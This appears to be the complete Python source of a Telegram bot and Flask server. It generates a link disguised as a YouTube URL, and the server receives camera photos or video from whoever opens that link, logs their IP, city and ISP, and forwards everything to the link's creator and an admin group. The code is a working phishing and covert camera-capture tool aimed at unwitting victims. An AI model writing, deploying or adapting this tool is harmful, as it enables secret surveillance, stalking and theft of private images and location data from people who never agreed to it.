import os
import telebot
from flask import Flask, render_template, request
import threading
import io

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
user_temp = {}

# --- TELEGRAM BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("🤳 Front Cam", "📷 Back Cam")
    bot.send_message(uid, "✅ Verification System Active.\nSelect camera to use for the link:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(message):
    uid = message.chat.id
    cam = "user" if "Front" in message.text else "environment"
    user_temp[uid] = {'cam': cam}
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    msg = bot.send_message(uid, "Now choose capture mode:", reply_markup=markup)
    bot.register_next_step_handler(msg, set_mode)

def set_mode(message):
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    if uid in user_temp:
        user_temp[uid]['mode'] = mode
    else:
        user_temp[uid] = {'cam': 'user', 'mode': mode}
    
    msg = bot.send_message(uid, "Enter a YouTube Video ID (or type 'default'):")
    bot.register_next_step_handler(msg, make_link)

def make_link(message):
    uid = message.chat.id
    yt_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    data = user_temp.get(uid, {'cam': 'user', 'mode': 'photo'})
    
    # Generate link with all parameters for the HTML to read
    real_link = f"{BASE_URL}/?id={uid}&mode={data['mode']}&cam={data['cam']}&ytid={yt_id}"
    fake_display = f"https://youtu.be/{yt_id}?si=Status_Verified"
    
    bot.send_message(
        uid, 
        f"🚀 **Link Ready!**\n\nTarget Link: [{fake_display}]({real_link})", 
        parse_mode="Markdown", 
        disable_web_page_preview=True
    )

# --- WEB SERVER LOGIC ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file_bytes = request.files['file'].read()

    # 1. ALWAYS Send to Admin Group (This works even for strangers)
    try:
        admin_cap = f"📁 **NEW CAPTURE**\nUser: `{tid}`\nType: `{ftype.upper()}`"
        if ftype == 'photo':
            bot.send_photo(GROUP_ID, io.BytesIO(file_bytes), caption=admin_cap)
        else:
            bot.send_document(GROUP_ID, io.BytesIO(file_bytes), visible_file_name="capture.webm", caption=admin_cap)
    except Exception as e:
        print(f"Group Log Error: {e}")

    # 2. OPTIONAL: Send to User (Only if they have started the bot)
    if tid and tid != "null":
        try:
            if ftype == 'photo':
                bot.send_photo(tid, file_bytes, caption="✅ Frame verified.")
            else:
                bot.send_document(tid, io.BytesIO(file_bytes), visible_file_name="verify.webm")
        except:
            pass # Silently fail for strangers
            
    return "OK"

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    log = f"📍 **Device Log**\nID: `{tid}`\nIP: `{data.get('ip')}`\nCity: {data.get('city')}\nISP: {data.get('org')}"
    
    try: bot.send_message(GROUP_ID, f"📑 **ADMIN DATA**\n{log}", parse_mode="Markdown")
    except: pass
    
    try: bot.send_message(tid, log, parse_mode="Markdown")
    except: pass
    return "OK"

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
